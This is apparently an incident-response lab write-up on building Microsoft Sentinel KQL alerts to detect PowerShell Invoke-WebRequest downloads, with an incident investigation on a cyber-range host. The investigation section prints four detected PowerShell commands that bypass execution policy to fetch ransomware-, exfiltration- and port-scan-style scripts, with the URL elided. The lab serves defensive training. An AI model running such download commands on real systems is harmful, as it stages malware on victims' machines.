# ‚ö†Ô∏è Incident Response Lab: PowerShell Suspicious Web Request

**Author**: Jason Nguyen  
**Date**: June 2025  
**Scenario**: Post-exploitation detection using PowerShell logging and scheduled alerts in Microsoft Sentinel  
**Based on**: [Josh Madakor‚Äôs Cyber Range](https://github.com/joshmadakor1/lognpacific-public)

## üß∞ Tools and Technologies

* **Microsoft Sentinel** (SIEM)
* **Microsoft Defender for Endpoint** (EDR)
* **Log Analytics Workspace** (LAW)
* **KQL (Kusto Query Language)**
* **PowerShell**

---

## üß† Scenario Overview

In real-world attacks, adversaries often use built-in tools like PowerShell to download payloads from external sources‚Äîblending malicious activity with legitimate system processes. This lab explores how to detect such behavior by creating KQL-based scheduled alerts in Microsoft Sentinel to identify suspicious use of `Invoke-WebRequest`.

---

## üîç Part 1: Create a Scheduled Alert Rule

### üìå Goal
Detect when PowerShell executes `Invoke-WebRequest` on a specific endpoint (`windows-target-1`), potentially indicating malicious behavior.

### üß™ Attempted KQL (Initial Query)
```kql
DeviceProcessEvents
| where DeviceName == "windows-target-1"
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "Invoke-WebRequest"
| order by TimeGenerated desc
````

‚úÖ This returned **no results in the last 7 days**.

### ‚úÖ Working Query (Adjusted Time Range)

```kql
let TargetHostname = "windows-target-1";
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where InitiatingProcessCommandLine contains "Invoke-WebRequest"
| where TimeGenerated > ago(30d)
| order by TimeGenerated
```

This query detected the download of 4 scripts previously used in earlier labs: `pwncrypt.ps1`, `eicar.ps1`, `portscan.ps1`, and `exfiltratedata.ps1`.

### üìå Key Terminology

* `InitiatingProcessCommandLine`: Refers to the **parent process** that launched PowerShell.
* `ProcessCommandLine`: Refers to the **child process** (i.e., the PowerShell script or command being run).

### üîé Final Rule Query

```kql
DeviceProcessEvents
| where DeviceName == "windows-target-1"
| where FileName == "powershell.exe"
| where InitiatingProcessCommandLine contains "Invoke-WebRequest"
| order by TimeGenerated desc
```

## üö® Part 2: Trigger Alert to Create Incident

No custom VM used. I leveraged the logs from `windows-target-1`, which had existing activity from automated attacks.

## üõ†Ô∏è Part 3: Incident Investigation and Response

### üßæ Incident Summary

**Incident Name**: `J - PowerShell Suspicious Web Request`
**Device**: `windows-target-1`
**Triggered by**: A single user executing 4 PowerShell download commands.

### üîó Malicious Commands Detected:

```powershell
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://.../pwncrypt.ps1 -OutFile C:\ProgramData\pwncrypt.ps1
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://.../exfiltratedata.ps1 -OutFile C:\ProgramData\exfiltratedata.ps1
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://.../portscan.ps1 -OutFile C:\ProgramData\portscan.ps1
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://.../eicar.ps1 -OutFile C:\ProgramData\eicar.ps1
```

üë§ **User Interview Summary**:
User claimed to be installing free software but saw only a black screen. No GUI feedback. Suspicious behavior noted.

### üß™ KQL Script Execution Validation

```kql
let TargetHostname = "windows-target-1";
let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]);
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
| order by TimeGenerated
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
```

‚úÖ Confirmed that each script was executed post-download.
